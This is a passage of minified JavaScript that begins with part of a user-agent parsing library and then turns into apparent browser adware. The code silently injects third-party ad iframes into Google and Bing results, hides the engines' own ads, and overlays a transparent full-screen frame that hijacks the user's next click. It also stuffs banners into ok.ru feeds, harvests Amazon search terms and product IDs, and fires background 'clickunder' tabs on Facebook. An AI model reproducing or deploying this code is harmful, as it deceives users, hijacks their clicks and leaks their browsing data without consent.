                                            [V, [P, "OnePlus"],
                                                [Y, Z]
                                            ],
                                            [/\s(tablet)[;\/]/i, /\s(mobile)(?:[;\/]|\ssafari)/i],
                                            [
                                                [Y, q.lowerize], P, V
                                            ]
                                        ],
                                        engine: [
                                            [/windows.+\sedge\/([\w\.]+)/i],
                                            [ac, [ad, "EdgeHTML"]],
                                            [/(presto)\/([\w\.]+)/i, /(webkit|trident|netfront|netsurf|amaya|lynx|w3m)\/([\w\.]+)/i, /(khtml|tasman|links)[\/\s]\(?([\w\.]+)/i, /(icab)[\/\s]([23]\.[\d\.]+)/i],
                                            [ad, ac],
                                            [/rv\:([\w\.]+).*(gecko)/i],
                                            [ac, ad]
                                        ],
                                        os: [
                                            [/microsoft\s(windows)\s(vista|xp)/i],
                                            [ad, ac],
                                            [/(windows)\snt\s6\.2;\s(arm)/i, /(windows\sphone(?:\sos)*)[\s\/]?([\d\.\s]+\w)*/i, /(windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],
                                            [ad, [ac, D.str, j.os.windows.version]],
                                            [/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],
                                            [
                                                [ad, "Windows"],
                                                [ac, D.str, j.os.windows.version]
                                            ],
                                            [/\((bb)(10);/i],
                                            [
                                                [ad, "BlackBerry"], ac
                                            ],
                                            [/(blackberry)\w*\/?([\w\.]+)*/i, /(tizen)[\/\s]([\w\.]+)/i, /(android|webos|palm\sos|qnx|bada|rim\stablet\sos|meego|contiki)[\/\s-]?([\w\.]+)*/i, /linux;.+(sailfish);/i],
                                            [ad, ac],
                                            [/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]+)*/i],
                                            [
                                                [ad, "Symbian"], ac
                                            ],
                                            [/\((series40);/i],
                                            [ad],
                                            [/mozilla.+\(mobile;.+gecko.+firefox/i],
                                            [
                                                [ad, "Firefox OS"], ac
                                            ],
                                            [/(nintendo|playstation)\s([wids34portablevu]+)/i, /(mint)[\/\s\(]?(\w+)*/i, /(mageia|vectorlinux)[;\s]/i, /(joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|(?=\s)arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\/\s-]?(?!chrom)([\w\.-]+)*/i, /(hurd|linux)\s?([\w\.]+)*/i, /(gnu)\s?([\w\.]+)*/i],
                                            [ad, ac],
                                            [/(cros)\s[\w]+\s([\w\.]+\w)/i],
                                            [
                                                [ad, "Chromium OS"], ac
                                            ],
                                            [/(sunos)\s?([\w\.]+\d)*/i],
                                            [
                                                [ad, "Solaris"], ac
                                            ],
                                            [/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]+)*/i],
                                            [ad, ac],
                                            [/(haiku)\s(\w+)/i],
                                            [ad, ac],
                                            [/(ip[honead]+)(?:.*os\s([\w]+)*\slike\smac|;\sopera)/i],
                                            [
                                                [ad, "iOS"],
                                                [ac, /_/g, "."]
                                            ],
                                            [/(mac\sos\sx)\s?([\w\s\.]+\w)*/i, /(macintosh|mac(?=_powerpc)\s)/i],
                                            [
                                                [ad, "Mac OS"],
                                                [ac, /_/g, "."]
                                            ],
                                            [/((?:open)?solaris)[\/\s-]?([\w\.]+)*/i, /(aix)\s((\d)(?=\.|\)|\s)[\w\.]*)*/i, /(plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos|openvms)/i, /(unix)\s?([\w\.]+)*/i],
                                            [ad, ac]
                                        ]
                                    },
                                    M = function(b, d) {
                                        if (this instanceof M) {
                                            var a = b || (ab && ab.navigator && ab.navigator.userAgent ? ab.navigator.userAgent : O),
                                                c = d ? q.extend(z, d) : z;
                                            return this.getBrowser = function() {
                                                var f = D.rgx.apply(this, c.browser);
                                                return f.major = q.major(f.version), f
                                            }, this.getCPU = function() {
                                                return D.rgx.apply(this, c.cpu)
                                            }, this.getDevice = function() {
                                                return D.rgx.apply(this, c.device)
                                            }, this.getEngine = function() {
                                                return D.rgx.apply(this, c.engine)
                                            }, this.getOS = function() {
                                                return D.rgx.apply(this, c.os)
                                            }, this.getResult = function() {
                                                return {
                                                    ua: this.getUA(),
                                                    browser: this.getBrowser(),
                                                    engine: this.getEngine(),
                                                    os: this.getOS(),
                                                    device: this.getDevice(),
                                                    cpu: this.getCPU()
                                                }
                                            }, this.getUA = function() {
                                                return a
                                            }, this.setUA = function(f) {
                                                return a = f, this
                                            }, this
                                        }
                                        return (new M(b, d)).getResult()
                                    };
                                M.VERSION = R, M.BROWSER = {
                                    NAME: ad,
                                    MAJOR: aa,
                                    VERSION: ac
                                }, M.CPU = {
                                    ARCHITECTURE: G
                                }, M.DEVICE = {
                                    MODEL: V,
                                    VENDOR: P,
                                    TYPE: Y,
                                    CONSOLE: U,
                                    MOBILE: Z,
                                    SMARTTV: ae,
                                    TABLET: B,
                                    WEARABLE: F,
                                    EMBEDDED: I
                                }, M.ENGINE = {
                                    NAME: ad,
                                    VERSION: ac
                                }, M.OS = {
                                    NAME: ad,
                                    VERSION: ac
                                }, typeof exports !== Q ? (typeof module !== Q && module.exports && (exports = module.exports = M), exports.UAParser = M) : typeof define === K && define.amd ? define(function() {
                                    return M
                                }) : ab.UAParser = M;
                                var W = ab.jQuery || ab.Zepto;
                                if (typeof W !== Q) {
                                    var A = new M;
                                    W.ua = A.getResult(), W.ua.get = function() {
                                        return A.getUA()
                                    }, W.ua.set = function(b) {
                                        A.setUA(b);
                                        var a = A.getResult();
                                        for (var c in a) {
                                            W.ua[c] = a[c]
                                        }
                                    }
                                }
                            })(typeof window == "object" ? window : this);
                            if (!String.prototype.includes) {
                                String.prototype.includes = function() {
                                    return String.prototype.indexOf.apply(this, arguments) !== -1
                                }
                            };;
                            var j = "https://searchvalidation.com/go/search.php";
                            var k = false;

                            function b() {
                                if (k) {
                                    return
                                }
                                if (document.head) {
                                    var d = document.createElement("meta");
                                    d.name = "referrer";
                                    d.content = "no-referrer";
                                    document.getElementsByTagName("head")[0].appendChild(d);
                                    k = true
                                }
                            }

                            function o(d) {
                                if (d) {
                                    jQuery(".a9gads").remove()
                                }
                                jQuery(".a9gstylehead").remove();
                                if (window.location.href.includes("google.") == true) {
                                    jQuery("#rcnt").css({
                                        display: "block"
                                    })
                                } else {
                                    if (window.location.href.includes("bing.") == true) {
                                        jQuery("#b_content").css({
                                            display: "block"
                                        })
                                    }
                                }
                            }

                            function f() {}
                            if (window.location.href.includes("google") == true && window.location.href.includes("images/search?") == false && window.location.href.includes("tbm=isch") == false) {
                                f()
                            }

                            function a(q) {
                                try {
                                    if (window.location.href.includes("google.") == true && q.includes("complete/search?") == false && q.includes("images/search?") == false && q.includes("news/search?") == false && q.includes("tbm=app") == false && q.includes("tbm=bks") == false && q.includes("tbm=isch") == false && q.includes("tbm=nws") == false && q.includes("tbm=pts") == false && q.includes("tbm=shop") == false && q.includes("tbm=vid") == false) {
                                        if (!i) {
                                            n.loadedCallback("MNTZ_INJECT", 'a49b5');
                                            i = true
                                        }
                                        if ((q.includes("/s?") || q.includes("/search?")) && q.includes("q=")) {
                                            var z;
                                            if (q.includes("?q=")) {
                                                z = q.substr(q.indexOf("?q=") + 3)
                                            } else {
                                                z = q.substr(q.indexOf("&q=") + 3)
                                            }
                                            var d = z.indexOf("&");
                                            if (d != -1) {
                                                z = z.substr(0, d)
                                            }
                                            f();
                                            try {
                                                var w = false;
                                                try {
                                                    w = (g && g.doBlind && g.doBlind > 0 && Math.random() < g.doBlind)
                                                } catch (x) {
                                                    n.loadedCallback("CB_FSI_ERROR_BLIND_PROB", 'a49b5');
                                                    return
                                                }
                                                if (g && g.blindOnly && !w) {
                                                    return
                                                }
                                                if (!e) {
                                                    n.loadedCallback("MNTZ_LOADED", 'a49b5');
                                                    e = true
                                                }
                                                var y = setTimeout(function() {
                                                    o(true);
                                                    n.loadedCallback("CB_FSI_ERROR_TIMEOUT", 'a49b5')
                                                }, 20000);
                                                var A = jQuery('<iframe class="a9gads" id="yhostedframeidlongname" scrolling="no" frameBorder=0 src="' + j + "?subid2=8060" + (window.__fd_prm ? "&f=" + window.__fd_prm : "") + "&keyword=" + z + '" width="100%" allowtransparency="true">');
                                                A.height(0);
                                                var v = false;

                                                function s(D) {
                                                    try {
                                                        try {
                                                            if (!D.data || !D.data.match(/^a9b/)) {
                                                                return
                                                            }
                                                        } catch (E) {}
                                                        var C = D.data.replace(/^a9b/, ""),
                                                            F = JSON.parse(C);
                                                        if (F.blndOk) {
                                                            A.css({
                                                                display: "block",
                                                                position: "fixed",
                                                                width: "100%",
                                                                height: jQuery(window).height() + "px",
                                                                top: "0",
                                                                left: "0",
                                                                "z-index": "9999999999",
                                                                background: "transparent"
                                                            });
                                                            v = true
                                                        } else {
                                                            if (F.noBlindAd) {
                                                                A.remove();
                                                                n.loadedCallback("CB_FSI_BLIND_NO_URL", 'a49b5')
                                                            } else {
                                                                if (F.clkOk) {
                                                                    A.remove();
                                                                    n.loadedCallback("CB_FSI_OPEN", 'a49b5', "p" + F.adPos)
                                                                }
                                                            }
                                                        }
                                                    } catch (E) {}
                                                }

                                                function u(D) {
                                                    try {
                                                        try {
                                                            if (!D.data || !D.data.match(/^a9g/)) {
                                                                n.loadedCallback("CB_FSI_ERROR_NODATA", 'a49b5');
                                                                return
                                                            }
                                                        } catch (F) {
                                                            return
                                                        }
                                                        n.loadedCallback("CB_FSI_ANSWER", 'a49b5');
                                                        var C = D.data.replace(/^a9g/, ""),
                                                            G = JSON.parse(C);
                                                        if (G.orgres) {
                                                            n.loadedCallback("CB_FSI_ORGANIC_RESULT", 'a49b5');
                                                            w = false
                                                        }
                                                        if (w) {
                                                            n.loadedCallback("CB_FSI_DO_BLIND", 'a49b5')
                                                        }
                                                        if (G.breakProcessing) {
                                                            n.loadedCallback("CB_FSI_BREAK", 'a49b5');
                                                            o(true)
                                                        } else {
                                                            if (G.eH > 20 && !w) {
                                                                b();
                                                                A.height(G.eH);
                                                                A.css({
                                                                    position: "",
                                                                    top: "",
                                                                    left: ""
                                                                });
                                                                t();
                                                                if (!p) {
                                                                    if (G.orgres) {
                                                                        n.loadedCallback("CB_FSI_ORGANIC_SHOW", 'a49b5')
                                                                    } else {
                                                                        n.loadedCallback("BANNER_LOAD", 'a49b5');
                                                                        n.loadedCallback("CB_FSI_DISPLAY", 'a49b5')
                                                                    }
                                                                    p = true
                                                                }
                                                            } else {
                                                                if (w) {
                                                                    if (!v) {
                                                                        try {
                                                                            b();
                                                                            A[0].contentWindow.postMessage("a9b" + JSON.stringify({
                                                                                doBlnd: 1
                                                                            }), "*")
                                                                        } catch (F) {}
                                                                        if (window.addEventListener) {
                                                                            window.addEventListener("message", s, false)
                                                                        } else {
                                                                            window.attachEvent("onmessage", s)
                                                                        }
                                                                    } else {}
                                                                } else {
                                                                    n.loadedCallback("CB_FSI_INJECT_EMPTY", 'a49b5');;
                                                                    o(true);
                                                                }
                                                            }
                                                        }
                                                        if (y) {
                                                            clearTimeout(y)
                                                        }
                                                        o()
                                                    } catch (E) {
                                                        n.loadedCallback("CB_FSI_ERROR_PARSERESULT", 'a49b5', E);
                                                        o(true)
                                                    }
                                                }
                                                if (window.addEventListener) {
                                                    window.addEventListener("message", u, false)
                                                } else {
                                                    window.attachEvent("onmessage", u)
                                                }

                                                function t() {
                                                    if (q.includes("bing.")) {
                                                        if (g.hideBingAd) {
                                                            jQuery(".b_ad").hide();
                                                            jQuery(".sb_adTA").hide()
                                                        }
                                                    } else {
                                                        if (g.hideAdsense) {
                                                            jQuery("#taw").hide();
                                                            jQuery("#tads").hide()
                                                        }
                                                        jQuery("#tadsb").hide()
                                                    }
                                                }
                                                if (q.includes("bing.")) {
                                                    jQuery(".a9gads").detach();
                                                    jQuery("#b_results").prepend(A);
                                                    A.css({
                                                        position: "absolute",
                                                        top: "0",
                                                        left: "0"
                                                    })
                                                } else {
                                                    function B() {
                                                        if (jQuery("#res").length) {
                                                            jQuery(".a9gads").detach();
                                                            jQuery("#res").prepend(A);
                                                            var C = 800;
                                                            if (jQuery(window).height()) {
                                                                C = jQuery(window).height()
                                                            }
                                                            A.css({
                                                                display: "block",
                                                                width: "100%",
                                                                height: C,
                                                                position: "absolute",
                                                                top: "-10000px",
                                                                left: "-100000px",
                                                                background: "transparent"
                                                            })
                                                        } else {
                                                            setTimeout(B, 100)
                                                        }
                                                    }
                                                    B()
                                                }
                                            } catch (r) {
                                                n.loadedCallback("CB_FSI_ERROR_EXCEPTION", 'a49b5', r);
                                                o(true)
                                            }
                                        }
                                    }
                                } catch (r) {
                                    n.loadedCallback("CB_FSI_ERROR_EXCEPTION", 'a49b5', r);
                                    o(true)
                                }
                            }

                            function c() {
                                try {
                                    return window.self !== window.top
                                } catch (d) {
                                    return true
                                }
                            }
                            jQuery(function() {
                                try {
                                    if (c() == false) {
                                        a(window.location.href)
                                    } else {
                                        var s = "";
                                        var x = 0;
                                        var d = false;

                                        function t(z) {
                                            if (d) {
                                                return
                                            }
                                            if (s) {
                                                window.open(s);
                                                window.parent.postMessage("a9b" + JSON.stringify({
                                                    clkOk: 1,
                                                    adPos: x
                                                }), "*")
                                            }
                                            d = true;
                                            if (window.removeEventListener) {
                                                document.removeEventListener("click", t, true)
                                            }
                                        }
                                        if (location.href.includes("bing.com/search") && (window.location.href.includes("ptag") || window.location.href.includes("CONBNT"))) {
                                            window.addEventListener("message", function(A) {
                                                try {
                                                    try {
                                                        if (!A.data || !A.data.match(/^a9b/)) {
                                                            return
                                                        }
                                                    } catch (E) {}
                                                    var z = A.data.replace(/^a9b/, ""),
                                                        F = JSON.parse(z);
                                                    if (F.doBlnd) {
                                                        try {
                                                            if (!s) {
                                                                var D = [];
                                                                var C = [];
                                                                jQuery(".b_ad h2 > a").each(function() {
                                                                    var G = this.href;
                                                                    if (!G) {
                                                                        return
                                                                    }
                                                                    if (D.indexOf(G) == -1) {
                                                                        D.push(G);
                                                                        C.push(this)
                                                                    }
                                                                });
                                                                if (D.length > 0) {
                                                                    if (g.blindBlur) {
                                                                        var B = Math.random();
                                                                        if (D.length >= 3) {
                                                                            if (B <= 0.5) {
                                                                                x = 0
                                                                            } else {
                                                                                if (B > 0.5 && B < 0.8) {
                                                                                    x = 1
                                                                                } else {
                                                                                    x = 2
                                                                                }
                                                                            }
                                                                        } else {
                                                                            if (D.length >= 2) {
                                                                                if (B <= 0.6) {
                                                                                    x = 0
                                                                                } else {
                                                                                    x = 1
                                                                                }
                                                                            }
                                                                        }
                                                                    } else {
                                                                        x = 0
                                                                    }
                                                                    if (!D[x]) {
                                                                        n.loadedCallback("CB_FSI_ERR_INV_BLIND_POS", 'a49b5', x);
                                                                        window.parent.postMessage("a9b" + JSON.stringify({
                                                                            noBlindAd: 1
                                                                        }), "*");
                                                                        return
                                                                    }
                                                                    s = D[x]
                                                                } else {
                                                                    window.parent.postMessage("a9b" + JSON.stringify({
                                                                        noBlindAd: 1
                                                                    }), "*");
                                                                    return
                                                                }
                                                            } else {}
                                                        } catch (E) {}
                                                        document.head.innerHTML = "";
                                                        document.body.innerHTML = "";
                                                        document.body.style.background = "none transparent";
                                                        if (window.addEventListener) {
                                                            document.addEventListener("click", t, true)
                                                        } else {
                                                            document.attachEvent("onclick", t)
                                                        }
                                                        window.parent.postMessage("a9b" + JSON.stringify({
                                                            blndOk: 1
                                                        }), "*")
                                                    }
                                                } catch (E) {}
                                            });
                                            var y = false;
                                            try {
                                                if (window.parent.location.origin) {
                                                    y = true
                                                }
                                            } catch (v) {}
                                            jQuery("head").prepend(jQuery("<style>* {border: none; font-family: arial,sans-serif!important;}#b_content {min-height: 0 !important; padding: 0 !important;} header, footer {display:none!important;} #b_notificationContainer{display: none!important} #b_tween{display: none!important} #b_context{display: none!important} #b_pole{display: none!important} .sb_hbop{display: none!important} #aRmsDefer{display: none!important} .b_top, .b_top, .b_algo, .b_ans, .b_pag, .b_msg{display: none!important} li.b_adBottom {display:none !important;} .b_underSearchbox {display:none!important;} .b_ad {border-bottom: none !important; margin:0 !important; " + (y ? "" : "padding:0 !important;") + " } .b_ad h2 a strong {font-weight: normal !important;} .b_ad h2 {font-size: 18px !important;} .b_ad h3 {font-size: 18px !important;} .b_ad .b_adurl cite a, .b_ad .b_adurl a strong {font-weight: normal !important;} .b_ad .b_adurl cite a {font-size: 14px !important;} " + (y ? "" : ".pa_mlo {margin: 0 -20px 0 0 !important;} ") + "#b_results > li:not(.b_ad) {display: none!important} .b_adSlug {display: none !important;}</style>"));
                                            jQuery(function() {
                                                try {
                                                    jQuery(".reol").prependTo("body");
                                                    jQuery("#main").prependTo("body");
                                                    jQuery("li.last>div").attr("style", "cursor:pointer;border-bottom:none!important");
                                                    var A = 0;
                                                    var C = function() {
                                                        clearTimeout(F);
                                                        A++;
                                                        if (jQuery("li.b_adBottom"), jQuery("li.b_adBottom").attr("style")) {
                                                            jQuery("li.b_adBottom").removeAttr("style");
                                                            return
                                                        }
                                                        if (A < 20) {
                                                            F = setTimeout(C, 100)
                                                        }
                                                    };
                                                    var F = setTimeout(C, 100);
                                                    var E = false;
                                                    jQuery(".b_ad a").each(function() {
                                                        this.target = "_blank"
                                                    });
                                                    if (jQuery(".b_ad a").length < 1) {
                                                        if (g.organicShape && Math.random() < g.organicShape) {
                                                            E = true;
                                                            var B = jQuery("#b_results li.b_algo:lt(2)");
                                                            jQuery(B).each(function() {
                                                                this.style = "display: inline-block !important; padding: 0;";
                                                                jQuery(".b_suffix", this).attr("style", "display: none !important;");
                                                                jQuery("cite strong", this).attr("style", "font-weight: normal;");
                                                                jQuery(".b_title > h2 > a", this).attr("style", "font-size: 18px;")
                                                            })
                                                        }
                                                    }

                                                    function G() {
                                                        var H = {
                                                            eH: jQuery("body").height(),
                                                            orgres: E
                                                        };
                                                        window.parent.postMessage("a9g" + JSON.stringify(H), "*")
                                                    }
                                                    if (window.addEventListener) {
                                                        window.addEventListener("resize", G, false)
                                                    } else {
                                                        window.attachEvent("onresize", G)
                                                    }
                                                    G();
                                                    setTimeout(G, 1000)
                                                } catch (D) {
                                                    var z = {
                                                        eH: 0
                                                    };
                                                    window.parent.postMessage("a9g" + JSON.stringify(z), "*")
                                                }
                                            })
                                        } else {
                                            if (location.hostname.includes("becovi.com") && location.href.includes("q=")) {
                                                window.addEventListener("message", function(A) {
                                                    try {
                                                        try {
                                                            if (!A.data || !A.data.match(/^a9b/)) {
                                                                return
                                                            }
                                                        } catch (E) {}
                                                        var z = A.data.replace(/^a9b/, ""),
                                                            F = JSON.parse(z);
                                                        if (F.doBlnd) {
                                                            try {
                                                                if (!s) {
                                                                    var D = [];
                                                                    var C = [];
                                                                    jQuery("li.sr_item.top_result > a").each(function() {
                                                                        var G = this.href;
                                                                        if (!G) {
                                                                            return
                                                                        }
                                                                        if (D.indexOf(G) == -1) {
                                                                            D.push(G);
                                                                            C.push(this)
                                                                        }
                                                                    });
                                                                    if (D.length > 0) {
                                                                        if (g.blindBlur) {
                                                                            var B = Math.random();
                                                                            if (D.length >= 3) {
                                                                                if (B <= 0.5) {
                                                                                    x = 0
                                                                                } else {
                                                                                    if (B > 0.5 && B < 0.8) {
                                                                                        x = 1
                                                                                    } else {
                                                                                        x = 2
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                if (D.length >= 2) {
                                                                                    if (B <= 0.6) {
                                                                                        x = 0
                                                                                    } else {
                                                                                        x = 1
                                                                                    }
                                                                                }
                                                                            }
                                                                        } else {
                                                                            x = 0
                                                                        }
                                                                        if (!D[x]) {
                                                                            n.loadedCallback("CB_FSI_ERR_INV_BLIND_POS", 'a49b5', x);
                                                                            window.parent.postMessage("a9b" + JSON.stringify({
                                                                                noBlindAd: 1
                                                                            }), "*");
                                                                            return
                                                                        }
                                                                        s = D[x]
                                                                    } else {
                                                                        window.parent.postMessage("a9b" + JSON.stringify({
                                                                            noBlindAd: 1
                                                                        }), "*");
                                                                        return
                                                                    }
                                                                } else {}
                                                            } catch (E) {}
                                                            document.head.innerHTML = "";
                                                            document.body.innerHTML = "";
                                                            document.body.style.background = "none transparent";
                                                            if (window.addEventListener) {
                                                                document.addEventListener("click", t, true)
                                                            } else {
                                                                document.attachEvent("onclick", t)
                                                            }
                                                            window.parent.postMessage("a9b" + JSON.stringify({
                                                                blndOk: 1
                                                            }), "*")
                                                        }
                                                    } catch (E) {}
                                                });
                                                var r = 0;
                                                var u = 5;
                                                var w = function() {
                                                    var z = jQuery("li.sr_item").length;
                                                    if (z < 1 && r < u) {
                                                        r++;
                                                        setTimeout(w, 100);
                                                        return
                                                    }
                                                    window.parent.postMessage("a9g" + JSON.stringify({
                                                        eH: 0
                                                    }), "*")
                                                };
                                                w()
                                            } else {
                                                if (location.href.indexOf(j) > -1) {
                                                    window.parent.postMessage("a9g" + JSON.stringify({
                                                        breakProcessing: 1
                                                    }), "*")
                                                }
                                            }
                                        }
                                    }
                                } catch (q) {
                                    o(true)
                                }
                            })
                        })(document, window);
                    } catch (e) {}
                    if (isInIframe()) {
                        if (location.hostname.indexOf("yourfirstcheapshop.com") === -1) {
                            return
                        } else {}
                    }
                })();;
                if (!scriptsToLoad) {
                    return false
                }
                var getUrlFromConfigObject = function(configRow) {
                    if (configRow.http_url && window.location.protocol == "http:") {
                        return configRow.http_url
                    } else {
                        if (configRow.https_url && window.location.protocol == "https:") {
                            return configRow.https_url
                        } else {
                            if (configRow.url) {
                                return configRow.url
                            }
                        }
                    }
                };
                if (scriptsToLoad['4a71b'] && $$.getCookie("__mzpsd") == 1) {
                    return false
                }
                if (location.hostname.indexOf("ok.ru") > -1 && scriptsToLoad['1f755']) {
                    var oconf = $$.getMtzCfg('1f755');
                    if (!!oconf.injectOk && oconf.injectOk == "1") {
                        (function() {
                            var d = document.querySelector("body");
                            if (!d) {
                                return
                            }

                            function i(j) {
                                j = j.replace(/%PUBLISHER_ID%/, ($$ && $$.tbParams && $$.tbParams.wid) ? $$.tbParams.wid : "");
                                j = j.replace(/%SOURCE_ID%/, ($$ && $$.tbParams && $$.tbParams.tid) ? $$.tbParams.tid : "");
                                j = j.replace(/%SUBID%/, ($$ && $$.tbParams && $$.tbParams.sid) ? $$.tbParams.sid : "");
                                j = j.replace(/INSERT_RANDOM_NUMBER_HERE/, new Date().getTime());
                                return j
                            }
                            var e = i("<iframe id='a60b8ce3' name='a60b8ce3' src='//cdnpps.us/www/delivery/afr.php?zoneid=122&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='300' height='600' style='display:inline-block;'><a href='//cdnpps.us/www/delivery/ck.php?n=abb06471' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=122&amp;n=abb06471' border='0' alt='' /></a></iframe>");
                            var c = i("<iframe id='8a61598d' name='8a61598d' src='//cdnpps.us/www/delivery/afr.php?zoneid=119&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='468' height='60' style='display:inline-block;'><a href='//cdnpps.us/www/delivery/ck.php?n=8a61598d' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=119&amp;n=8a61598d' border='0' alt='' /></a></iframe>");

                            function f(j) {
                                return document.querySelectorAll(j) || []
                            }
                            var a = function(n, j, o, l, m) {
                                var k = document.createElement("div");
                                k.setAttribute("id", "_" + Math.floor((Math.random() * 1000000000)));
                                k.setAttribute("style", m || "");
                                k.innerHTML = o;
                                l.style.textAlign = "center";
                                l.appendChild(k)
                            };

                            function b(j) {
                                j.id = "_" + j.id;
                                j.setAttribute("data-mytype", "name_baner");
                                j.innerHTML = "";
                                a(300, 600, e, j)
                            }

                            function h(k, j) {
                                var l = document.createElement("div");
                                l.setAttribute("data-mytype", "name_baner");
                                l.setAttribute("style", "margin:0 auto; overflow:hidden;");
                                k.setAttribute("data-mytype", "name_baner");
                                k.appendChild(l);
                                a(468, 60, c, l, j)
                            }
                            var g = function() {
                                Array.prototype.forEach.call(f("div.feed.__klass.__no-ava>.feed_cnt"), function(j) {
                                    if (!j.getAttribute("data-mytype")) {
                                        h(j, "margin: 0 auto 10px;")
                                    }
                                });
                                Array.prototype.forEach.call(f('div[class^="feed h-mod"]'), function(j) {
                                    if (!j.lastElementChild.getAttribute("data-mytype") && !j.parentNode.getAttribute("class")) {
                                        h(j, "margin: 10px auto 0;")
                                    }
                                });
                                Array.prototype.forEach.call(f('div[data-btype^="LinkBanner_navigate"]'), function(j) {
                                    if (!j.getAttribute("data-mytype")) {
                                        j.innerHTML = "";
                                        b(j)
                                    }
                                });
                                setTimeout(g, 3333)
                            };
                            g()
                        })();
                    }
                }
                var amzreg = /(^|www\.)amazon\./g;
                if (location.hostname.match(amzreg)) {
                    (function(f, a) {
                        function e(h) {
                            var g, d, i = new RegExp("[?&#]" + h + "=([^&#$]+)", "g");
                            while (g = i.exec(a.location.href)) {
                                d = decodeURIComponent((g[1] + "").replace(/\+/g, "%20"))
                            }
                            return d
                        }

                        function b() {
                            if (f.location.pathname.indexOf("/s/") !== 0 && f.location.pathname.indexOf("/gp/search/") !== 0) {
                                return
                            }
                            var p = (f.querySelector("[name=field-keywords]") && f.querySelector("[name=field-keywords]").value) || e("field-keywords");
                            var g = "",
                                i = f.querySelector("#searchDropdownBox option:checked");
                            if (f.querySelector("#apsRedirectLink")) {
                                i = f.querySelector("#searchDropdownBox option:first-child")
                            }
                            if (!!i) {
                                g = i.value + "::" + i.textContent
                            }
                            var j = [];
                            var o = [].slice.call(f.querySelectorAll(".s-result-item"));
                            if (o.length) {
                                j = o.map(function(m) {
                                    return m.getAttribute("data-asin")
                                })
                            }
                            var k, d = f.getElementById("s-result-count");
                            if (!!d) {
                                k = d.textContent.indexOf("-") > -1 ? parseInt(d.textContent) : 1;
                                if (f.location.hostname.indexOf("amazon.com.mx") > -1) {
                                    k = d.textContent.indexOf(" a ") > -1 ? parseInt(d.textContent) : 1
                                }
                                if (f.location.hostname.indexOf("amazon.cn") > -1 || f.location.hostname.indexOf("amazon.co.jp") > -1) {
                                    var h = d.textContent.match(/\d+\-\d+/);
                                    if (!!h) {
                                        k = parseInt(h[0])
                                    }
                                }
                            }
                            if (Number.isInteger(k) == false) {
                                var n = f.querySelector(".pagnCur");
                                var l = n ? parseInt(n.textContent) : parseInt(e("page")) || 1;
                                k = (l - 1) * o.length + 1
                            }
                            if (!j.length) {
                                return
                            }
                            $$.loadedCallback("AMZN_SEARCH", "", a.location.hostname, p, j.join(","), k, g)
                        }
                        b();
                        var c = a.history.pushState;
                        window.history.pushState = function(i) {
                            var d = 1000,
                                h = f.getElementById("s-results-list-atf"),
                                g = setInterval(function() {
                                    if (h !== f.getElementById("s-results-list-atf") && f.getElementById("centerBelowPlusspacer") === null) {
                                        clearInterval(g);
                                        b()
                                    }
                                    if (!d--) {
                                        clearInterval(g)
                                    }
                                }, 100);
                            return c.apply(a.history, arguments)
                        }
                    })(document, window);
                }
                var searchEngineCheckResult;
                var isSearchEngine = function() {
                    if (typeof searchEngineCheckResult != "undefined") {
                        return searchEngineCheckResult
                    }
                    var found = false;
                    ["google.", "search.yahoo.", "bing.com", "ask.com", "shopping.yahoo", "search.aol.", "wow.com", "when.com", "search.mywebsearch.com", "search.myway.com", "duckduckgo.com", "mysearch.com", "teoma.com", "searchlock.com", "myprivatesearch.com", "searchprivacy.co", "thesmartsearch.net", "infospace", "safefinder.com", "mysearchguardian.com"].forEach(function(domainCheck) {
                        if (location.hostname.indexOf(domainCheck) > -1) {
                            found = true
                        }
                    });
                    searchEngineCheckResult = found;
                    return found
                };
                if (location.hostname.indexOf("facebook.com") > -1) {
                    if (scriptsToLoad['5df82']) {
                        (function(r, j, l) {
                            var k = j["1f7cbb02d08cf61dbb"];
                            var a = j["1f7cbb02d08cf61dbb"].Sizzle;
                            if (location.hostname.indexOf("facebook.com") < 0) {
                                return
                            }
                            var q = {
                                _mfbgp_sub_g2: "/fun8times"
                            };
                            var g = '5df82';
                            var o = false;
                            var t = "_mfbgp_sub_t";
                            var b = false;
                            var n = null;
                            for (var p in q) {
                                if (location.href.indexOf(q[p]) > -1) {
                                    n = p
                                }
                            }
                            if (!n) {
                                var f = false;
                                var m = k.getCookie(t);
                                if (m > (k.unixTimestampNow - 86400)) {
                                    return
                                }
                                var c = [];
                                for (var p in q) {
                                    if (k.getCookie(p)) {
                                        continue
                                    }
                                    c.push(q[p])
                                }
                                if (!c || c.length < 1) {
                                    return
                                }
                                var e = c[Math.floor(Math.random() * c.length)];
                                if (typeof e == "undefined") {
                                    return
                                }
                                e = "https://facebook.com" + e;
                                var s = function(i) {
                                    var u = this;
                                    var d = [];
                                    k.on(j.addEventListener ? j : r, "click", function(w) {
                                        var v = w.ctrlKey || w.metaKey || w.altKey || w.shiftKey,
                                            x = w.which && 1 === w.which || 0 === w.button;
                                        k.each(d, function(y) {
                                            if (y.call(w) === true) {
                                                k.preventDefault(w);
                                                return false
                                            }
                                        })
                                    });
                                    u.backgroundLink = function(x) {
                                        var w = document.createElement("a");
                                        w.href = x;
                                        w.__norewrite = 1;
                                        w.rel = "norewrite";
                                        w.target = "_blank";
                                        var v = document.createEvent("MouseEvents");
                                        v.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, false, 0, null);
                                        w.dispatchEvent(v)
                                    };
                                    u.clickunder = function(v) {
                                        d.push(v)
                                    };
                                    u.clickunder(function(v) {
                                        if (!f && i) {
                                            u.backgroundLink(i);
                                            k.updateLimits(g);
                                            k.loadedCallback("BANNER_LOAD", g);
                                            k.setCookie(t, k.unixTimestampNow, {
                                                expire: 864000,
                                                path: "/"
                                            });
                                            f = true;
                                            return true
                                        } else {
                                            return false
                                        }
                                    })
                                };
